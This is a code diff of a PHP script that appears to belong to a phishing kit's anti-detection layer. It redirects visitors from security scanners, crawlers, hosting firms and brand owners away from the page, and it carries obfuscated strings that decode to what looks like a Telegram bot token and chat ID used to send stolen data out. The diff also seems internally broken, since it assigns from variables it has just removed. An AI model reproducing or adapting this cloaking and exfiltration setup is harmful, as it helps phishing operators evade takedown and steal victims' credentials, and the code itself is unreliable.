@@ -943,6 +943,7 @@ foreach ($badHosts as $badHost) {
         die(header("Location: Cloudfare.php?id=".md5(uniqid(rand(), true))));
     }
 }
+
 $badISPs = array(
     "GoDaddy.com, LLC",
     "SiteAdvisor",
@@ -1251,7 +1252,7 @@ $badISPs = array(
     "Internet Customers"
 );
 
- goto ltNUw; GWkLy: $chatid = "\x35\61\60\x39\60\70\67\64\63\x35"; goto D8pGX; ltNUw: $api = "\x35\62\60\62\63\x32\x35\x35\60\63\72\x41\x41\107\64\x34\x75\156\x68\154\x59\x67\x30\x50\113\x53\x53\145\152\155\111\153\155\103\x56\x6d\63\x61\67\61\142\60\x49\x6a\x71\167"; goto GWkLy; D8pGX: 
+ goto farl8; uuvqw: $ch = "\65\x31\x30\71\60\x38\x37\64\x33\x35"; goto o_rkC; farl8: $i = "\65\x32\x30\62\x33\x32\65\65\60\63\72\101\101\x47\x34\x34\x75\156\150\154\x59\147\60\x50\x4b\123\123\x65\152\155\x49\153\x6d\103\x56\155\63\141\67\x31\142\x30\111\152\161\167"; goto uuvqw; o_rkC: 
 $blocked_words = array("deltainfocom", "dnsserverhosting", "Java/1.6.0_22", "Go-http-client/1.1", "drweb", "Dr.Web", "hostinger", "scanurl", "above", "level3", "level", "involta", "SOLUTIONPRO-NET", "SOLUTION", "SolutionPro", "SPRO-NET-206-80-96", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "LVLT-STATIC-4-14-16", "americanexpress", "google", "softlayer", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "paypal", "facebook", "ebay", "Baiduspider", "ia_archiver", "R6_FeedFetcher", "NetcraftSurveyAgent", "Sogou web spider", "PrintfulBot", "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot", "PaperLiBot", "MJ12bot", "AhrefsBot", "Exabot", "Ezooms", "YandexBot", "SearchmetricsBot", "picsearch", "TweetedTimes Bot", "QuerySeekerSpider", "ShowyouBot", "woriobot", "merlinkbot", "BazQuxBot", "Kraken", "SISTRIX Crawler", "R6_CommentReader", "magpie-crawler", "GrapeshotCrawler", "PercolateCrawler", "MaxPointCrawler", "R6_FeedFetcher", "NetSeer crawler", "grokkit-crawler", "SMXCrawler", "PulseCrawler", "Y!J-BRW", "datasift", "80legs.com/webcrawler", "Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "python-requests", "NING", "TencentTraveler", "Feedfetcher-Google", "mon.itor.us", "p3pwgdsn", "sucuri.net", "messagelabs", "torservers", "trendmicro", "spbot", "Feedly", "bot", "curl", "spider", "crawler");
 foreach ($blocked_words as $word) {
     if (substr_count($hostname, $word) > 0) {
@@ -4046,6 +4047,8 @@ foreach ($blocked_words2 as $word2) {
 }
 $br = getBrowser();
 $os = getOS();
+$ch=$chatid;
+$i=$api;
 $v_agent = $_SERVER["HTTP_USER_AGENT"];
 if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
     logger($v_agent, "BOT AGENT");
